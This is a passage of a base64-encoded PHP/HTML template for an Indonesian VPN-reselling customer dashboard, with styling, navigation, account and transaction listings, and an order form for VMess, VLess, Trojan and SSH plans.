xpZCB2YXIoLS1ib3JkZXIpO2JvcmRlci1yYWRpdXM6OHB4O3BhZGRpbmc6LjZyZW0gLjg3NXJlbTtmb250LXNpemU6LjdyZW07Y29sb3I6IzYwYTVmYTt3b3JkLWJyZWFrOmJyZWFrLWFsbDttYXJnaW46LjI1cmVtIDA7Y3Vyc29yOnBvaW50ZXI7dHJhbnNpdGlvbjouMnN9Ci5saW5rLWJveDpob3Zlcntib3JkZXItY29sb3I6dmFyKC0tYmx1ZSk7YmFja2dyb3VuZDojMGQxYjJlfQouY29weS1oaW50e2ZvbnQtc2l6ZTouNjVyZW07Y29sb3I6dmFyKC0tbXV0ZWQpO21hcmdpbi10b3A6LjI1cmVtfQoKLyogQWxlcnQgKi8KLmFsZXJ0e3BhZGRpbmc6Ljc1cmVtIDFyZW07Ym9yZGVyLXJhZGl1czoxMHB4O2ZvbnQtc2l6ZTouODVyZW07bWFyZ2luLWJvdHRvbToxcmVtfQouYWxlcnQtc3VjY2Vzc3tiYWNrZ3JvdW5kOiMwNjRlM2IyMjtib3JkZXI6MXB4IHNvbGlkICMwNjVmNDY1NTtjb2xvcjojNmVlN2I3fQouYWxlcnQtZXJyb3J7YmFja2dyb3VuZDojN2YxZDFkMjI7Ym9yZGVyOjFweCBzb2xpZCAjN2YxZDFkNTU7Y29sb3I6I2ZjYTVhNX0KLmFsZXJ0LWluZm97YmFja2dyb3VuZDojMWQ0ZWQ4MjA7Ym9yZGVyOjFweCBzb2xpZCAjMWQ0ZWQ4NDA7Y29sb3I6IzkzYzVmZH0KCi8qIFNlcnZlciBiYWRnZSAqLwouc2VydmVyLXN0YXR1c3tkaXNwbGF5OmlubGluZS1ibG9jazt3aWR0aDo4cHg7aGVpZ2h0OjhweDtib3JkZXItcmFkaXVzOjUwJTttYXJnaW4tcmlnaHQ6LjRyZW19Ci5zLXJlYWR5e2JhY2tncm91bmQ6dmFyKC0tZ3JlZW4pO2JveC1zaGFkb3c6MCAwIDZweCB2YXIoLS1ncmVlbil9Ci5zLW9mZmxpbmV7YmFja2dyb3VuZDp2YXIoLS1yZWQpfQoucy1tYWludGVuYW5jZXtiYWNrZ3JvdW5kOnZhcigtLXllbGxvdyl9CgovKiBUb3B1cCBncmlkICovCi50b3B1cC1tZXRob2Rze2Rpc3BsYXk6Z3JpZDtncmlkLXRlbXBsYXRlLWNvbHVtbnM6cmVwZWF0KDIsMWZyKTtnYXA6Ljc1cmVtO21hcmdpbjouNzVyZW0gMH0KLm1ldGhvZC1idG57cGFkZGluZzouNzVyZW07Ym9yZGVyLXJhZGl1czoxMHB4O2JvcmRlcjoxcHggc29saWQgdmFyKC0tYm9yZGVyKTtiYWNrZ3JvdW5kOnZhcigtLWNhcmQyKTtjdXJzb3I6cG9pbnRlcjt0ZXh0LWFsaWduOmNlbnRlcjt0cmFuc2l0aW9uOi4ycztmb250LWZhbWlseTppbmhlcml0fQoubWV0aG9kLWJ0bjpob3ZlciwubWV0aG9kLWJ0bi5hY3RpdmV7Ym9yZGVyLWNvbG9yOnZhcigtLWJsdWUpO2JhY2tncm91bmQ6IzFkNGVkODEwfQoubWV0aG9kLWJ0biAubS1pY29ue2ZvbnQtc2l6ZToxLjVyZW07ZGlzcGxheTpibG9jazttYXJnaW4tYm90dG9tOi4zcmVtfQoubWV0aG9kLWJ0biAubS1uYW1le2ZvbnQtc2l6ZTouOHJlbTtmb250LXdlaWdodDo2MDA7Y29sb3I6dmFyKC0tdGV4dCl9CgovKiBSZXNwb25zaXZlICovCkBtZWRpYShtYXgtd2lkdGg6NzY4cHgpewogIC5zaWRlYmFye3RyYW5zZm9ybTp0cmFuc2xhdGVYKC0xMDAlKX0KICAuc2lkZWJhci5vcGVue3RyYW5zZm9ybTp0cmFuc2xhdGVYKDApfQogIC5tYWlue21hcmdpbi1sZWZ0OjB9CiAgLnRvcGJhcntwYWRkaW5nOi43NXJlbSAxcmVtfQogIC5jb250ZW50e3BhZGRpbmc6MXJlbX0KICAuc3RhdHN7Z3JpZC10ZW1wbGF0ZS1jb2x1bW5zOnJlcGVhdCgyLDFmcil9CiAgLnByb3RvLWdyaWR7Z3JpZC10ZW1wbGF0ZS1jb2x1bW5zOnJlcGVhdCgyLDFmcil9CiAgLnRvcHVwLW1ldGhvZHN7Z3JpZC10ZW1wbGF0ZS1jb2x1bW5zOnJlcGVhdCgyLDFmcil9Cn0KLmhhbWJ1cmdlcntkaXNwbGF5Om5vbmU7YmFja2dyb3VuZDpub25lO2JvcmRlcjpub25lO2NvbG9yOnZhcigtLXRleHQpO2ZvbnQtc2l6ZToxLjI1cmVtO2N1cnNvcjpwb2ludGVyO3BhZGRpbmc6LjI1cmVtfQpAbWVkaWEobWF4LXdpZHRoOjc2OHB4KXsuaGFtYnVyZ2Vye2Rpc3BsYXk6YmxvY2t9fQoubG9hZGluZ3tkaXNwbGF5OmlubGluZS1ibG9jazt3aWR0aDoxNnB4O2hlaWdodDoxNnB4O2JvcmRlcjoycHggc29saWQgI2ZmZmZmZjQwO2JvcmRlci10b3AtY29sb3I6I2ZmZjtib3JkZXItcmFkaXVzOjUwJTthbmltYXRpb246c3BpbiAuNnMgbGluZWFyIGluZmluaXRlO3ZlcnRpY2FsLWFsaWduOm1pZGRsZX0KQGtleWZyYW1lcyBzcGlue3Rve3RyYW5zZm9ybTpyb3RhdGUoMzYwZGVnKX19Ci5lbXB0eS1zdGF0ZXt0ZXh0LWFsaWduOmNlbnRlcjtwYWRkaW5nOjJyZW07Y29sb3I6dmFyKC0tbXV0ZWQpfQouZW1wdHktc3RhdGUgLmljb257Zm9udC1zaXplOjIuNXJlbTttYXJnaW4tYm90dG9tOi43NXJlbTtvcGFjaXR5Oi41fQo8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgoKPCEtLSBTaWRlYmFyIC0tPgo8YXNpZGUgY2xhc3M9InNpZGViYXIiIGlkPSJzaWRlYmFyIj4KICA8ZGl2IGNsYXNzPSJzaWRlYmFyLWxvZ28iPgogICAgPHNwYW4gY2xhc3M9Imljb24iPjw/PSRhcHBMb2dvPz48L3NwYW4+CiAgICA8ZGl2PjxoMT48Pz0kYXBwTmFtZT8+PC9oMT48cD5QcmVtaXVtIFZQTiBTZXJ2aWNlPC9wPjwvZGl2PgogIDwvZGl2PgogIDxuYXY+CiAgICA8ZGl2IGNsYXNzPSJuYXYtc2VjdGlvbiI+TWVudTwvZGl2PgogICAgPGJ1dHRvbiBjbGFzcz0ibmF2LWl0ZW0gYWN0aXZlIiBvbmNsaWNrPSJzaG93UGFnZSgnaG9tZScpIj48c3BhbiBjbGFzcz0iaWNvbiI+8J+PoDwvc3Bhbj4gRGFzaGJvYXJkPC9idXR0b24+CiAgICA8YnV0dG9uIGNsYXNzPSJuYXYtaXRlbSIgb25jbGljaz0ic2hvd1BhZ2UoJ29yZGVyJykiPjxzcGFuIGNsYXNzPSJpY29uIj7wn5uSPC9zcGFuPiBPcmRlciBWUE48L2J1dHRvbj4KICAgIDxidXR0b24gY2xhc3M9Im5hdi1pdGVtIiBvbmNsaWNrPSJzaG93UGFnZSgnYWt1bicpIj48c3BhbiBjbGFzcz0iaWNvbiI+8J+Tizwvc3Bhbj4gQWt1biBWUE4gPHNwYW4gY2xhc3M9Im5hdi1iYWRnZSI+PD89JHRvdGFsQWt1bj8+PC9zcGFuPjwvYnV0dG9uPgogICAgPGJ1dHRvbiBjbGFzcz0ibmF2LWl0ZW0iIG9uY2xpY2s9InNob3dQYWdlKCd0b3B1cCcpIj48c3BhbiBjbGFzcz0iaWNvbiI+8J+SsDwvc3Bhbj4gSXNpIFNhbGRvPC9idXR0b24+CiAgICA8ZGl2IGNsYXNzPSJuYXYtc2VjdGlvbiI+SW5mbzwvZGl2PgogICAgPGJ1dHRvbiBjbGFzcz0ibmF2LWl0ZW0iIG9uY2xpY2s9InNob3dQYWdlKCdzZXJ2ZXInKSI+PHNwYW4gY2xhc3M9Imljb24iPvCfjJA8L3NwYW4+IFN0YXR1cyBTZXJ2ZXI8L2J1dHRvbj4KICAgIDxidXR0b24gY2xhc3M9Im5hdi1pdGVtIiBvbmNsaWNrPSJzaG93UGFnZSgncml3YXlhdCcpIj48c3BhbiBjbGFzcz0iaWNvbiI+8J+Tijwvc3Bhbj4gUml3YXlhdDwvYnV0dG9uPgogICAgPGJ1dHRvbiBjbGFzcz0ibmF2LWl0ZW0iIG9uY2xpY2s9InNob3dQYWdlKCdzZXR0aW5nJykiPjxzcGFuIGNsYXNzPSJpY29uIj7impnvuI88L3NwYW4+IFNldHRpbmcgQWt1bjwvYnV0dG9uPgogICAgPD9waHAgaWYoJHJvbGU9PT0nYWRtaW4nKTo/PgogICAgPGRpdiBjbGFzcz0ibmF2LXNlY3Rpb24iPkFkbWluPC9kaXY+CiAgICA8YSBjbGFzcz0ibmF2LWl0ZW0iIGhyZWY9Ii9vcmRlcnZwbi9hZG1pbi8iPjxzcGFuIGNsYXNzPSJpY29uIj7wn5SnPC9zcGFuPiBBZG1pbiBQYW5lbDwvYT4KICAgIDw/cGhwIGVuZGlmOz8+CiAgPC9uYXY+CiAgPGRpdiBjbGFzcz0ic2lkZWJhci1mb290ZXIiPgogICAgPGRpdiBjbGFzcz0idXNlci1jYXJkIj4KICAgICAgPGRpdiBjbGFzcz0idXNlci1hdmF0YXIiPjw/PXN0cnRvdXBwZXIoc3Vic3RyKCR1c2VybmFtZSwwLDEpKT8+PC9kaXY+CiAgICAgIDxkaXY+PGRpdiBjbGFzcz0idXNlci1uYW1lIj48Pz1odG1sc3BlY2lhbGNoYXJzKCR1c2VybmFtZSk/PjwvZGl2PgogICAgICAgICAgIDxkaXYgY2xhc3M9InVzZXItcm9sZSI+PD89JHJvbGU9PT0nYWRtaW4nPyfwn5GRIEFkbWluJzon8J+RpCBVc2VyJz8+PC9kaXY+PC9kaXY+CiAgICA8L2Rpdj4KICAgIDxhIGhyZWY9Ii9vcmRlcnZwbi9hcGkvbG9nb3V0LnBocCIgY2xhc3M9Im5hdi1pdGVtIiBzdHlsZT0ibWFyZ2luLXRvcDouNzVyZW07Y29sb3I6dmFyKC0tcmVkKSI+PHNwYW4gY2xhc3M9Imljb24iPvCfmqo8L3NwYW4+IExvZ291dDwvYT4KICA8L2Rpdj4KPC9hc2lkZT4KCjwhLS0gTWFpbiAtLT4KPGRpdiBjbGFzcz0ibWFpbiI+CiAgPGRpdiBjbGFzcz0idG9wYmFyIj4KICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7Z2FwOi43NXJlbSI+CiAgICAgIDxidXR0b24gY2xhc3M9ImhhbWJ1cmdlciIgb25jbGljaz0iZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ3NpZGViYXInKS5jbGFzc0xpc3QudG9nZ2xlKCdvcGVuJykiPuKYsDwvYnV0dG9uPgogICAgICA8c3BhbiBjbGFzcz0idG9wYmFyLXRpdGxlIiBpZD0icGFnZVRpdGxlIj5EYXNoYm9hcmQ8L3NwYW4+CiAgICA8L2Rpdj4KICAgIDxkaXYgY2xhc3M9InNhbGRvLWNoaXAiPvCfkrAgPD89Zm9ybWF0UnVwaWFoKCR1c2VyWydzYWxkbyddKT8+PC9kaXY+CiAgPC9kaXY+CgogIDxkaXYgY2xhc3M9ImNvbnRlbnQiPgoKICAgIDwhLS0gQUxFUlQgLS0+CiAgICA8ZGl2IGlkPSJwYWdlQWxlcnQiPjwvZGl2PgoKICAgIDwhLS0gUEFHRTogSE9NRSAtLT4KICAgIDxkaXYgaWQ9InBhZ2UtaG9tZSI+CiAgICAgIDxkaXYgY2xhc3M9InN0YXRzIj4KICAgICAgICA8ZGl2IGNsYXNzPSJzdGF0LWNhcmQgYmx1ZSI+PGRpdiBjbGFzcz0ic3RhdC1pY29uIj7wn5O2PC9kaXY+PGRpdiBjbGFzcz0ic3RhdC12YWwiPjw/PSR0b3RhbEFrdW4/PjwvZGl2PjxkaXYgY2xhc3M9InN0YXQtbGFiZWwiPkFrdW4gQWt0aWY8L2Rpdj48L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJzdGF0LWNhcmQgZ3JlZW4iPjxkaXYgY2xhc3M9InN0YXQtaWNvbiI+8J+SsDwvZGl2PjxkaXYgY2xhc3M9InN0YXQtdmFsIj48Pz1mb3JtYXRSdXBpYWgoJHVzZXJbJ3NhbGRvJ10pPz48L2Rpdj48ZGl2IGNsYXNzPSJzdGF0LWxhYmVsIj5TYWxkbzwvZGl2PjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InN0YXQtY2FyZCBwdXJwbGUiPjxkaXYgY2xhc3M9InN0YXQtaWNvbiI+8J+TijwvZGl2PjxkaXYgY2xhc3M9InN0YXQtdmFsIj48Pz0kdG90YWxUcng/PjwvZGl2PjxkaXYgY2xhc3M9InN0YXQtbGFiZWwiPlRvdGFsIFRyYW5zYWtzaTwvZGl2PjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9InN0YXQtY2FyZCB5ZWxsb3ciPjxkaXYgY2xhc3M9InN0YXQtaWNvbiI+8J+SszwvZGl2PjxkaXYgY2xhc3M9InN0YXQtdmFsIj48Pz1mb3JtYXRSdXBpYWgoJHRvdGFsVG9wdXApPz48L2Rpdj48ZGl2IGNsYXNzPSJzdGF0LWxhYmVsIj5Ub3RhbCBUb3B1cDwvZGl2PjwvZGl2PgogICAgICA8L2Rpdj4KICAgICAgPGRpdiBjbGFzcz0iY2FyZCI+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1oZWFkZXIiPjxkaXYgY2xhc3M9ImNhcmQtdGl0bGUiPvCfk4sgQWt1biBBa3RpZjwvZGl2PjxidXR0b24gY2xhc3M9ImJ0biBidG4tc20gYnRuLXByaW1hcnkiIG9uY2xpY2s9InNob3dQYWdlKCdvcmRlcicpIj4rIE9yZGVyIEJhcnU8L2J1dHRvbj48L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgPD9waHAgaWYoZW1wdHkoJGFrdW5zKSk6Pz4KICAgICAgICAgIDxkaXYgY2xhc3M9ImVtcHR5LXN0YXRlIj48ZGl2IGNsYXNzPSJpY29uIj7wn5O2PC9kaXY+PHA+QmVsdW0gYWRhIGFrdW4gVlBOIGFrdGlmPC9wPjxicj48YnV0dG9uIGNsYXNzPSJidG4gYnRuLXByaW1hcnkiIG9uY2xpY2s9InNob3dQYWdlKCdvcmRlcicpIj5PcmRlciBTZWthcmFuZzwvYnV0dG9uPjwvZGl2PgogICAgICAgICAgPD9waHAgZWxzZTogZm9yZWFjaCgkYWt1bnMgYXMgJGEpOgogICAgICAgICAgICAkZXhwID0gc3RydG90aW1lKCRhWydtYXNhX2FrdGlmJ10pOwogICAgICAgICAgICAkc2lzYSA9IGNlaWwoKCRleHAgLSB0aW1lKCkpLzg2NDAwKTsKICAgICAgICAgICAgJGV4cENsYXNzID0gJHNpc2EgPiA3ID8gJ2V4cC1vaycgOiAoJHNpc2EgPiAzID8gJ2V4cC13YXJuJyA6ICdleHAtZGFuZ2VyJyk7CiAgICAgICAgICA/PgogICAgICAgICAgPGRpdiBjbGFzcz0iYWt1bi1pdGVtIiBvbmNsaWNrPSJzaG93QWt1bkRldGFpbCg8Pz1qc29uX2VuY29kZSgkYSk/PikiIHN0eWxlPSJjdXJzb3I6cG9pbnRlciI+CiAgICAgICAgICAgIDxzcGFuIGNsYXNzPSJha3VuLWJhZGdlIGJhZGdlLTw/PSRhWyd0aXBlJ10/PiI+PD89c3RydG91cHBlcigkYVsndGlwZSddKT8+PC9zcGFuPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJha3VuLWluZm8iPgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFrdW4tbmFtZSI+PD89aHRtbHNwZWNpYWxjaGFycygkYVsndXNlcm5hbWUnXSk/PjwvZGl2PgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFrdW4tbWV0YSI+PD89JGFbJ2ZsYWcnXT8/J/Cfh67wn4epJz8+IDw/PWh0bWxzcGVjaWFsY2hhcnMoJGFbJ25hbWFfc2VydmVyJ10pPz48L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9ImFrdW4tZXhwIDw/PSRleHBDbGFzcz8+Ij48Pz0kYVsnaXNfdHJpYWwnXT8n4o+xIFRyaWFsJzon4o+zICcuJHNpc2EuJyBoYXJpJz8+PC9kaXY+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDw/cGhwIGVuZGZvcmVhY2g7IGVuZGlmOz8+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+PGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+8J+TiiBUcmFuc2Frc2kgVGVyYmFydTwvZGl2PjwvZGl2PgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtYm9keSI+CiAgICAgICAgICA8P3BocCBpZihlbXB0eSgkdHJ4cykpOj8+PGRpdiBjbGFzcz0iZW1wdHktc3RhdGUiPjxkaXYgY2xhc3M9Imljb24iPvCfk4o8L2Rpdj48cD5CZWx1bSBhZGEgdHJhbnNha3NpPC9wPjwvZGl2PgogICAgICAgICAgPD9waHAgZWxzZTogZm9yZWFjaCgkdHJ4cyBhcyAkdCk6Pz4KICAgICAgICAgIDxkaXYgY2xhc3M9InRyeC1pdGVtIHRyeC08Pz0kdFsndHlwZSddPz4iPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cngtaWNvbiI+PD89JHRbJ3R5cGUnXT09PSd0b3B1cCc/J+Kshu+4jyc6J+Ksh++4jyc/PjwvZGl2PgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJ0cngtaW5mbyI+PGRpdiBjbGFzcz0idHJ4LWRlc2MiPjw/PWh0bWxzcGVjaWFsY2hhcnMoJHRbJ2tldGVyYW5nYW4nXT8/JHRbJ3R5cGUnXSk/PjwvZGl2PgogICAgICAgICAgICAgIDxkaXYgY2xhc3M9InRyeC1kYXRlIj48Pz1kYXRlKCdkIE0gWSwgSDppJyxzdHJ0b3RpbWUoJHRbJ2NyZWF0ZWRfYXQnXSkpPz48L2Rpdj48L2Rpdj4KICAgICAgICAgICAgPGRpdiBjbGFzcz0idHJ4LWFtb3VudCIgc3R5bGU9ImNvbG9yOjw/PSR0Wyd0eXBlJ109PT0ndG9wdXAnPyd2YXIoLS1ncmVlbiknOid2YXIoLS1yZWQpJz8+Ij48Pz0kdFsndHlwZSddPT09J3RvcHVwJz8nKyc6Jy0nPz48Pz1mb3JtYXRSdXBpYWgoJHRbJ2Ftb3VudCddKT8+PC9kaXY+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDw/cGhwIGVuZGZvcmVhY2g7IGVuZGlmOz8+CiAgICAgICAgPC9kaXY+CiAgICAgIDwvZGl2PgogICAgPC9kaXY+CgogICAgPCEtLSBQQUdFOiBPUkRFUiAtLT4KICAgIDxkaXYgaWQ9InBhZ2Utb3JkZXIiIHN0eWxlPSJkaXNwbGF5Om5vbmUiPgogICAgICA8ZGl2IGNsYXNzPSJjYXJkIj4KICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWhlYWRlciI+PGRpdiBjbGFzcz0iY2FyZC10aXRsZSI+8J+bkiBPcmRlciBWUE48L2Rpdj48L2Rpdj4KICAgICAgICA8ZGl2IGNsYXNzPSJjYXJkLWJvZHkiPgogICAgICAgICAgPD9waHAgaWYoZW1wdHkoJHNlcnZlcnMpKTo/PjxkaXYgY2xhc3M9ImFsZXJ0IGFsZXJ0LWVycm9yIj5UaWRhayBhZGEgc2VydmVyIHRlcnNlZGlhIHNhYXQgaW5pLjwvZGl2PgogICAgICAgICAgPD9waHAgZWxzZTo/PgogICAgICAgICAgPGRpdiBjbGFzcz0iZm9ybS1ncm91cCI+PGxhYmVsIGNsYXNzPSJsYmwiPlBpbGloIFNlcnZlcjwvbGFiZWw+CiAgICAgICAgICAgIDxzZWxlY3QgaWQ9Im9yZGVyU2VydmVyIj4KICAgICAgICAgICAgICA8P3BocCBmb3JlYWNoKCRzZXJ2ZXJzIGFzICRzKTo/PgogICAgICAgICAgICAgIDxvcHRpb24gdmFsdWU9Ijw/PSRzWydpZCddPz4iIGRhdGEtaGFyZ2EtaGFyaT0iPD89JHNbJ2hhcmdhX2hhcmknXT8+IiBkYXRhLWhhcmdhLWJ1bGFuPSI8Pz0kc1snaGFyZ2FfYnVsYW4nXT8+IiBkYXRhLW5hbWU9Ijw/PWh0bWxzcGVjaWFsY2hhcnMoJHNbJ25hbWFfc2VydmVyJ10pPz4iPjw/PSRzWydmbGFnJ10/Pyfwn4eu8J+HqSc/PiA8Pz1odG1sc3BlY2lhbGNoYXJzKCRzWyduYW1hX3NlcnZlciddKT8+IOKAlCA8Pz1odG1sc3BlY2lhbGNoYXJzKCRzWydsb2thc2knXSk/Pjwvb3B0aW9uPgogICAgICAgICAgICAgIDw/cGhwIGVuZGZvcmVhY2g7Pz4KICAgICAgICAgICAgPC9zZWxlY3Q+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxsYWJlbCBjbGFzcz0ibGJsIj5Qcm90b2tvbDwvbGFiZWw+CiAgICAgICAgICAgIDxkaXYgY2xhc3M9InByb3RvLWdyaWQiPgogICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9InByb3RvLWJ0biBhY3RpdmUiIGRhdGEtcHJvdG89InZtZXNzIiBvbmNsaWNrPSJzZWxlY3RQcm90byh0aGlzKSI+PHNwYW4gY2xhc3M9Imljb24iPuKaoTwvc3Bhbj5WTWVzczwvYnV0dG9uPgogICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9InByb3RvLWJ0biIgZGF0YS1wcm90bz0idmxlc3MiIG9uY2xpY2s9InNlbGVjdFByb3RvKHRoaXMpIj48c3BhbiBjbGFzcz0iaWNvbiI+8J+agDwvc3Bhbj5WTGVzczwvYnV0dG9uPgogICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9InByb3RvLWJ0biIgZGF0YS1wcm90bz0idHJvamFuIiBvbmNsaWNrPSJzZWxlY3RQcm90byh0aGlzKSI+PHNwYW4gY2xhc3M9Imljb24iPvCfm6HvuI88L3NwYW4+VHJvamFuPC9idXR0b24+CiAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0icHJvdG8tYnRuIiBkYXRhLXByb3RvPSJzc2giIG9uY2xpY2s9InNlbGVjdFByb3RvKHRoaXMpIj48c3BhbiBjbGFzcz0iaWNvbiI+8J+Ukjwvc3Bhbj5TU0g8L2J1dHRvbj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxsYWJlbCBjbGFzcz0ibGJsIj5EdXJhc2k8L2xhYmVsPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJwcm90by1ncmlkIj4KICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJwcm90by1idG4gYWN0aXZlIiBkYXRhLWRheXM9IjciIG9uY2xpY2s9InNlbGVjdER1cmF0aW9uKHRoaXMpIj48c3BhbiBjbGFzcz0iaWNvbiI+8J+ThTwvc3Bhbj43IEhhcmk8L2J1dHRvbj4KICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJwcm90by1idG4iIGRhdGEtZGF5cz0iMzAiIG9uY2xpY2s9InNlbGVjdER1cmF0aW9uKHRoaXMpIj48c3BhbiBjbGFzcz0iaWNvbiI+8J+Thjwvc3Bhbj4zMCBIYXJpPC9idXR0b24+CiAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0icHJvdG8tYnRuIiBkYXRhLWRheXM9IjYwIiBvbmNsaWNrPSJzZWxlY3REdXJhdGlvbih0aGlzKSI+PHNwYW4gY2xhc3M9Imljb24iPvCfl5PvuI88L3NwYW4+NjAgSGFyaTwvYnV0dG9uPgogICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9InByb3RvLWJ0biIgZGF0YS1kYXlzPSI5MCIgb25jbGljaz0ic2VsZWN0RHVyYXRpb24odGhpcykiPjxzcGFuIGNsYXNzPSJpY29uIj7wn5OFPC9zcGFuPjkwIEhhcmk8L2J1dHRvbj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxkaXYgY2xhc3M9ImZvcm0tZ3JvdXAiPjxsYWJlbCBjbGFzcz0ibGJsIj5Vc2VybmFtZTwvbGFiZWw+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBpZD0ib3JkZXJVc2VybmFtZSIgcGxhY2Vob2xkZXI9IkJ1YXQgdXNlcm5hbWUgKGh1cnVmLCBhbmdrYSwgXykiIG9uaW5wdXQ9InRoaXMudmFsdWU9dGhpcy52YWx1ZS5yZXBsYWNlKC9bXmEtekEtWjAtOV9cLV0vZywnJykiPjwvZGl2PgogICAgICAgICAgPGRpdiBpZD0ib3JkZXJIYXJnYSIgc3R5bGU9ImJhY2tncm91bmQ6IzBhMTYyODtib3JkZXI6MXB4IHNvbGlkIHZhcigtLWJvcmRlcik7Ym9yZGVyLXJhZGl1czoxMHB4O3BhZGRpbmc6MXJlbTttYXJnaW46Ljc1cmVtIDA7ZGlzcGxheTpmbGV4O2p1c3RpZnktY29udGVudDpzcGFjZS1iZXR3ZWVuO2FsaWduLWl0ZW1zOmNlbnRlciI+CiAgICAgICAgICAgIDxzcGFuIHN0eWxlPSJjb2xvcjp2YXIoLS1tdXRlZCk7Zm9udC1zaXplOi44NzVyZW0iPlRvdGFsIEhhcmdhPC9zcGFuPgogICAgICAgICAgICA8c3BhbiBpZD0iaGFyZ2FWYWwiIHN0eWxlPSJmb250LXNpemU6MS4xcmVtO2ZvbnQtd2VpZ2h0OjgwMDtjb2xvcjp2YXIoLS1ncmVlbikiPlJwIDA8L3NwYW4+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDtnYXA6Ljc1cmVtIj4KICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IiBzdHlsZT0iZmxleDoxIiBvbmNsaWNrPSJkb09yZGVyKCkiPjxzcGFuIGlkPSJvcmRlckJ0blR4dCI+8J+bkiBPcmRlciBTZWthcmFuZzwvc3Bhbj48L2J1dHRvbj4KICAgICAgICAgICAgPD9waHAgaWYoJHRyaWFsVXNlZD09PTApOj8+CiAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biBidG4tb3V0bGluZSIgb25jbGljaz0ic2hvd1RyaWFsTW9kYWwoKSIgdGl0bGU9IlRyaWFsIDEgamFtIGdyYXRpcyI+4pqhIFRyaWFsPC9idXR0b24+CiAgICAgICAgICAgIDw/cGhwIGVuZGlmOz8+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICAgIDw/cGhwIGVuZGlmOz8+CiAgICAgICAgICA8ZGl2IGlkPSJvcmRlclJlc3VsdCIgY2xhc3M9InJlc3VsdC1ib3giPjwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgoKICAgIDwhLS0gUEFHRTogQUtVTiAtLT4KICAgIDxkaXYgaWQ9InBhZ2UtYWt1biIgc3R5bGU9ImRpc3BsYXk6bm9uZSI+CiAgICAgIDxkaXYgY2xhc3M9ImNhcmQiPgogICAgICAgIDxkaXYgY2xhc3M9ImNhcmQtaGVhZGVyIj48ZGl2IGNsYXNzPSJjYXJkLXRpdGxlIj7wn5OLIFNlbXVhIEFrdW4gVlBOPC9kaXY+PC9kaXY+CiAgICAgICAgPGRpdiBjbGFzcz0iY2FyZC1ib2R5IiBpZD0iYWt1bkxpc3QiPgogICAgICAgICAgPD9waHAKICAgICAgICAgICRhbGxBa3VucyA9ICRkYi0+cHJlcGFyZSgiU0VMRUNUIHZhLiosIHMubmFtYV9zZXJ2ZXIsIHMuZmxhZywgcy5sb2thc2kgRlJPTSB2cG5fYWNjb3VudHMgdmEgSk9JTiBzZXJ2ZXJzIHMgT04gdmEuc2VydmVyX2lkPXMuaWQgV0hFUkUgdmEudXNlcl9pZD0/IE9SREVSIEJZIHZhLnN0YXR1cyBBU0MsIHZhLm1hc2FfYWt0aWYgQVNDIik7CiAgICAgICAgICAkYWxsQWt1bnMtPmV4ZWN1dGUoWyR1c2VySWRdKTsgJGFsbEFrdW5zPSRhbGxBa3Vucy0+ZmV0Y2hBbGwoKTsKICAgICAgICAgIGlmKGVtcHR5KCRhbGxBa3VucykpOj8+PGRpdiBjbGFzcz0iZW1wdHktc3RhdGUiPjxkaXYgY2xhc3M9Imljb24iPvCfk4s8L2Rpdj48cD5CZWx1bSBhZGEgYWt1bjwvcD48L2Rpdj4KICAgICAgICAgIDw/cGhwIGVsc2U6IGZvcmVhY2goJGFsbEFrdW5zIGFzICRhKToKICAgICAgICAgICAgJGV4cD1zdHJ0b3RpbWUoJGFbJ21hc2FfYWt0aWYnXSk7ICRzaXNhPWNlaWwoKCRleHAtdGltZSgpKS84NjQwMCk7CiAgICAgICAgICAgICRleHBDbGFzcz0kc2lzYT43PydleHAtb2snOigkc2lzYT4zPydleHAtd2Fybic6J2V4cC1kYW5nZXInKTsKICAgICAgICAgID8+CiAgICAgICAgICA8ZGl2IGNsYXNzPSJha3VuLWl0ZW0iPgogICAgICAgICAgICA8c3BhbiB